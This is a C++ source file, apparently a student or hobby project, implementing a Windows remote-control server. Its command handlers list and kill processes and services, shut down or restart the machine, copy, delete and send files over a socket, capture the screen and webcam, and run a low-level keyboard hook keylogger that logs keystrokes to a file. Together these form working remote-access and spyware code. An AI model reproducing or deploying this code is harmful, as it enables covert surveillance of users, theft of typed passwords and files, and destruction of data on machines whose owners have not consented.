#include "utils.h"

VideoCapture* cap = nullptr;
HHOOK hHook = NULL;
atomic<bool> keepKeyloggerRunning;
ofstream fo;
stringstream inp, out;
string keyloggerCapturePath = filesystem::current_path().string() + "/keylogger.txt";
string webcamCapturePath = filesystem::current_path().string() + "/webcam.png";
string screenCapturePath = filesystem::current_path().string() + "/screen.png";
string requestFilePath;

// Return a map of command to corresponding handler
map<string, map<string, function<void()>>> setupHandlers() {
    return {
        {
            "list", 
            {
                { 
                    "app", listApps 
                },
                { 
                    "service", listServices 
                },
                {
                    "dir",
                    [] {
                        string dirPath;
                        inp.ignore(numeric_limits<streamsize>::max(), '"');
                        getline(inp, dirPath, '"');
                        if (dirPath == "") {
                            throw invalid_argument("Missing argument: dirPath cannot be empty");
                        }
                        listDir(dirPath);
                    }
                }
            }
        },
        {
            "start",
            {
                {
                    "app", 
                    [] {
                        string appName;
                        inp >> appName;
                        if (appName == "") {
                            throw invalid_argument("Missing argument: appName cannot be empty");
                        }
                        startApp(const_cast<wchar_t*>(wstring(appName.begin(), appName.end()).c_str()));
                    }
                },
                {
                    "service",
                    [] {
                        string serviceName;
                        inp >> serviceName;
                        if (serviceName == "") {
                            throw invalid_argument("Missing argument: serviceName cannot be empty");
                        }
                        startServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                    }
                },
                {
                    "camera", startCamera
                },
                {
                    "keylogger", startKeylogger
                }
            }
        },
        {
            "stop",
            {
                {
                    "app", 
                    [] {
                        unsigned long procID = 0;
                        inp >> procID;
                        if (procID == 0) {
                            throw invalid_argument("Missing argument: procID cannot be empty");
                        }
                        stopApp(procID);
                    }
                },
                {
                    "service",
                    [] {
                        string serviceName;
                        inp >> serviceName;
                        if (serviceName == "") {
                            throw invalid_argument("Missing argument: serviceName cannot be empty");
                        }
                        stopServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                    }
                },
                {
                    "camera", stopCamera
                },
                {
                    "keylogger", stopKeylogger
                }
            }
        },
        {
            "power",
            {
                { "shutdown", shutdownMachine },
                { "restart", restartMachine }
            }
        },
        {
            "file",
            {
                {
                    "get",
                    [] {
                        inp.ignore(numeric_limits<streamsize>::max(), '"');
                        getline(inp, requestFilePath, '"');
                        if (requestFilePath == "") {
                            throw invalid_argument("Missing argument: filePath cannot be empty");
                        }
                        out << "File was get successfully.\n\nSee more in file " << getFileName(requestFilePath);
                    }
                },
                {
                    "copy",
                    [] {
                        string srcPath, desPath;
                        inp.ignore(numeric_limits<streamsize>::max(), '"');
                        getline(inp, srcPath, '"');
                        inp.ignore(numeric_limits<streamsize>::max(), '"');
                        getline(inp, desPath, '"');
                        if (srcPath == "" || desPath == "") {
                            throw invalid_argument("Missing argument: srcPath or desPath cannot be empty");
                        }
                        copyFile(wstring(srcPath.begin(), srcPath.end()).c_str(), wstring(desPath.begin(), desPath.end()).c_str());
                    }
                },
                {
                    "delete",
                    [] {
                        string filePath;
                        inp.ignore(numeric_limits<streamsize>::max(), '"');
                        getline(inp, filePath, '"');
                        if (filePath == "") {
                            throw invalid_argument("Missing argument: filePath cannot be empty");
                        }
                        deleteFile(wstring(filePath.begin(), filePath.end()).c_str());
                    }
                }
            }
        },
        {
            "capture", 
            {
                { "camera", captureCamera },
                { "screen", captureScreen }
            }
        },
        {
            "help",
            {
                { "", getInstruction }
            }
        },
        {
            "exit",
            {
                { 
                    "",
                    [] {
                        out << "Server stopped!\n";
                    }
                }
            }
        }
    };
}

void getInstruction() {
    out << "Usages:\n\n"
        << "\tlist\t[app|service|dir]\t[dirPath]\n"
        << "\tstart\t[app|service]\t\t[appPath|serviceName]\n"
        << "\tstop\t[app|service]\t\t[processID|serviceName]\n"
        << "\tpower\t[shutdown|restart]\n"
        << "\tfile\t[get|copy|delete]\tsrcPath\t[desPath]\n"
        << "\tcapture\t[camera|screen]\n"
        << "\tstart\t[camera|keylogger]\n"
        << "\tstop\t[camera|keylogger]\n"
        << "\thelp\n"
        << "\texit\n";
}

string getFileName(const string& filePath) {
    size_t pos1 = filePath.find_last_of('/'), pos2 = filePath.find_last_of('\\');
    size_t pos;
    if (pos1 == string::npos) {
        pos = pos2;
    }
    else if (pos2 == string::npos) {
        pos = pos1;
    }
    else {
        pos = (pos1 > pos2) ? pos1 : pos2;
    }
    return filePath.substr(pos + 1);
}

void listDir(const string& dirPath) {
    string searchPath = dirPath + "\\*";
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFileW(wstring(searchPath.begin(), searchPath.end()).c_str(), &findFileData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        throw runtime_error("Failed to get directory informations");
    }
    
    do {
        const wstring fileOrDir = findFileData.cFileName;
        if (fileOrDir != L"." && fileOrDir != L"..") {
            out << string(fileOrDir.begin(), fileOrDir.end()) << endl;
        }
    }
    while (FindNextFileW(hFind, &findFileData));
    
    FindClose(hFind);
}

// Function to get the main window handle of a process
HWND GetMainWindowHandle(DWORD processId) {
    HWND hwnd = GetTopWindow(0);
    while (hwnd) {
        DWORD windowProcessId;
        GetWindowThreadProcessId(hwnd, &windowProcessId);
        if (windowProcessId == processId && IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
            return hwnd;
        }
        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
    }
    return nullptr;
}

void listApps() {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) {
        throw runtime_error("Failed to take a snapshot of processes");
    }
    
    if (!Process32FirstW(snapshot, &entry)) {
        CloseHandle(snapshot);
        throw runtime_error("Failed to list processes");
    }
    
    out << " Process ID | " << setw(26) << right << "Executable\n";
    out << string(12, '-') << "o" << string(40, '-') << endl;
    do {
        HWND hwnd = GetMainWindowHandle(entry.th32ProcessID);
        if (hwnd) {
            wstring executeFileName(entry.szExeFile);
            out << setw(11) << right << entry.th32ProcessID << " | " 
                << string(executeFileName.begin(), executeFileName.end()) << endl;
        }
    } while (Process32NextW(snapshot, &entry));
    CloseHandle(snapshot);
}

void startApp(LPWSTR appPath) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(NULL, appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        throw runtime_error("Failed to start process");
    }

    out << "Process started successfully.\n";
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void stopApp(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    if (!hProcess) {
        throw runtime_error("Failed to open process");
    }
    
    if (!TerminateProcess(hProcess, 0)) {
        CloseHandle(hProcess);
        throw runtime_error("Failed to stop process");
    }

    CloseHandle(hProcess);
    out << "Process stopped successfully.\n";
}

void listServices() {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scmHandle) {
        throw runtime_error("OpenSCManager failed with error: " + to_string(GetLastError()));
    }
    
    DWORD bytesNeeded = 0, servicesCount = 0, resumeHandle = 0;
    EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded, &servicesCount, &resumeHandle);

    vector<BYTE> buffer(bytesNeeded);
    ENUM_SERVICE_STATUS* serviceStatus = reinterpret_cast<ENUM_SERVICE_STATUS*>(buffer.data());
    if (!EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, serviceStatus, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
        CloseServiceHandle(scmHandle);
        throw runtime_error("EnumServicesStatus failed with error: " + to_string(GetLastError()));
    }

    out << "" << setw(31) << right << "Service Name" << setw(22) << " | " << setw(57) << "Display Name" << setw(54) << " |  Status\n";
    out << string(51, '-') << "o" << string(102, '-') << "o" << string(10, '-') << endl;
    for (DWORD i = 0; i < servicesCount; i++) {
        wstring serviceName(serviceStatus[i].lpServiceName), displayName(serviceStatus[i].lpDisplayName);
        out << setw(50) << left << string(serviceName.begin(), serviceName.end()) << " | " 
            << setw(100) << string(displayName.begin(), displayName.end()) << " | " 
            << (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped") << endl;
    }
    
    CloseServiceHandle(scmHandle);
}

void startServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        throw runtime_error("OpenSCManager failed with error: " + to_string(GetLastError()));
    }

    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_START);
    if (!serviceHandle) {
        CloseServiceHandle(scmHandle);
        throw runtime_error("OpenService failed with error: " + to_string(GetLastError()));
    }

    if (!StartServiceW(serviceHandle, 0, nullptr)) {
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        throw runtime_error("StartService failed with error: " + to_string(GetLastError()));
    }
    
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    out << "Service started successfully.\n";
}

void stopServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        throw runtime_error("OpenSCManager failed with error: " + to_string(GetLastError()));
    }

    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_STOP);
    if (!serviceHandle) {
        CloseServiceHandle(scmHandle);
        throw runtime_error("OpenService failed with error: " + to_string(GetLastError()));
    }

    SERVICE_STATUS status;
    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        throw runtime_error("ControlService failed with error: " + to_string(GetLastError()));
    }
    
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    out << "Service stopped successfully.\n";
}

void shutdownMachine() {
    enableShutdownPrivilege();

    const wchar_t* shutdownMessage = L"System is shutting down for maintenance.";
    DWORD shutdownReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;

    if (!InitiateSystemShutdownExW(NULL, const_cast<wchar_t*>(shutdownMessage), SHUTDOWN_DELAY, TRUE, FALSE, shutdownReason)) {
        throw runtime_error("Failed to initiate shutdown");
    }
    
    out << "Shutdown initiated successfully. This machine will shutdown after " << SHUTDOWN_DELAY << " seconds.\n";
}

void restartMachine() {
    enableShutdownPrivilege();

    const wchar_t* restartMessage = L"System is restarting for maintenance.";
    DWORD restartReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;

    if (!InitiateSystemShutdownExW(NULL, const_cast<wchar_t*>(restartMessage), SHUTDOWN_DELAY, TRUE, TRUE, restartReason)) {
        throw runtime_error("Failed to initiate restart");
    }

    out << "Restart initiated successfully. This machine will restart after " << SHUTDOWN_DELAY << " seconds.\n";
}

void copyFile(LPCWSTR src, LPCWSTR dest) {
    if (!CopyFileW(src, dest, FALSE)) {
        throw runtime_error("Failed to copy file");
    }
    
    out << "File copied successfully.\n";
}

void deleteFile(LPCWSTR filePath) {
    if (!DeleteFileW(filePath)) {
        throw runtime_error("Failed to delete file");
    }

    out << "File deleted successfully.\n";
}

void captureScreen() {
    // Get the desktop device context (DC)
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Use device-independent pixels (DPI scaling) to get the actual screen resolution
    HDC hdc = GetDC(NULL);
    int screenWidth = GetDeviceCaps(hdc, DESKTOPHORZRES);  // Actual width in pixels
    int screenHeight = GetDeviceCaps(hdc, DESKTOPVERTRES); // Actual height in pixels

    // Create a compatible bitmap for the screen DC
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemoryDC, hBitmap);

    // Copy the screen content to the memory DC
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    // Convert the HBITMAP to a Mat
    BITMAP bmp;
    GetObjectW(hBitmap, sizeof(BITMAP), &bmp);

    // Prepare the OpenCV Mat structure
    Mat mat(screenHeight, screenWidth, CV_8UC4);  // 4 channels: BGRA format

    // Copy the bitmap data into the OpenCV Mat
    GetBitmapBits(hBitmap, bmp.bmHeight * bmp.bmWidthBytes, mat.data);

    // Clean up
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hdc);
    ReleaseDC(NULL, hScreenDC);

    // Convert BGRA to BGR (OpenCV default color format)
    Mat bgrMat;
    cvtColor(mat, bgrMat, COLOR_BGRA2BGR);

    // Save the captured screen to a file
    if (bgrMat.empty()) {
        throw runtime_error("Failed to capture screen");
    }
    
    if (!imwrite(screenCapturePath, bgrMat)) {
        throw runtime_error("Failed to save the screenshot");
    }
    
    out << "Capture screen successfuly.\n\nSee more in file " << screenCapturePath.substr(screenCapturePath.find_last_of("/") + 1);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKBDLLHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            // Get the virtual key code
            UINT vkCode = pKBDLLHookStruct->vkCode;

            // Prepare buffer for the key name
            vector<wchar_t> keyName(256);

            // Print the key name if the result is positive
            BYTE keyboardState[256];
            if (GetKeyboardState(keyboardState)) {
                int result = ToUnicodeEx(vkCode, 0, keyboardState, keyName.data(), static_cast<int>(keyName.size()), 0, GetKeyboardLayout(0));
                if (result > 0 && 32 <= vkCode && vkCode < 126) {
                    fo.write((const char*)keyName.data(), result);
                    fo << " ";
                }
                else {
                    fo << vkCode << " ";
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void KeyloggerThread() {
    // Set the hook for the keyboard
    hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    
    // Message loop to keep the hook alive
    MSG msg;
    while (keepKeyloggerRunning) {
        // Check for messages with a timeout
        if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        else {
            // Sleep to avoid busy waiting
            this_thread::sleep_for(chrono::milliseconds(10));
        }
    }

    // Unhook when done
    UnhookWindowsHookEx(hHook);
}

void startKeylogger() {
    fo.open(keyloggerCapturePath);
    if (!fo.is_open()) {
        throw runtime_error("Failed to start keylogger");
    }
    
    keepKeyloggerRunning = true;
    thread keyloggerThread(KeyloggerThread);
    keyloggerThread.detach(); // Detach the thread to run independently
    out << "Keylogger started successfully.\n";
}

void stopKeylogger() {
    if (!fo.is_open()) {
        throw runtime_error("Error: Keylogger is not start");
    }
    
    keepKeyloggerRunning = false;
    // Post a message to wake up the message loop
    PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
    out << "Keylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath);
    
    fo.close();
}

void startCamera() {
    cap = new VideoCapture(0);
    cap->set(cv::CAP_PROP_FRAME_WIDTH, 1280);
    cap->set(cv::CAP_PROP_FRAME_HEIGHT, 720);
    
    if (!cap || !cap->isOpened()) {
        throw runtime_error("Failed to open webcam");
    }
    
    Mat frame;
    *cap >> frame;
    if (!imwrite(webcamCapturePath, frame)) {
        throw runtime_error("Failed to save the capture image");
    }

    out << "Webcam opened successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
}

void captureCamera() {
    if (!cap || !cap->isOpened()) {
        throw runtime_error("Error: Webcam is not open");
    }
    
    Mat frame;
    *cap >> frame;
    if (!imwrite(webcamCapturePath, frame)) {
        throw runtime_error("Failed to save the capture image");
    }
    out << "Webcam captured successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
}

void stopCamera() {
    if (!cap || !cap->isOpened()) {
        throw runtime_error("Error: Webcam is not open");
    }
        
    Mat frame;
    *cap >> frame;
    if (!imwrite(webcamCapturePath, frame)) {
        throw runtime_error("Failed to save the capture image");
    }
        
    cap->release();
    destroyAllWindows();
    out << "Webcam closed successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
}

void sendFile(CSocket& socket, const string& filePath) {
    CFile file;
    if (!file.Open(wstring(filePath.begin(), filePath.end()).c_str(), CFile::modeRead)) {
        throw runtime_error("Failed to open file for reading");
    }
    
    CSocketFile socketFile(&socket);
    CArchive archive(&socketFile, CArchive::store);

    vector<BYTE> buffer(BUFFER_SIZE);
    UINT bytesRead;
    while ((bytesRead = file.Read(buffer.data(), static_cast<UINT>(buffer.size())))) {
        archive.Write(buffer.data(), bytesRead);
    }
    archive.Flush();
    file.Close();
}

void enableShutdownPrivilege() {
    HANDLE token;
    TOKEN_PRIVILEGES tkp;

    // Open a handle to the process's access token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        throw runtime_error("Failed to open process token. Error: " + to_string(GetLastError()));
    }

    // Look up the LUID for the shutdown privilege
    if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
        CloseHandle(token);
        throw runtime_error("Failed to lookup privilege value. Error: " + to_string(GetLastError()));
    }

    tkp.PrivilegeCount = 1;  // We are enabling one privilege
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token's privileges to enable shutdown privilege
    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
        CloseHandle(token);
        throw runtime_error("Failed to adjust token privileges. Error: " + to_string(GetLastError()));
    }

    CloseHandle(token);
}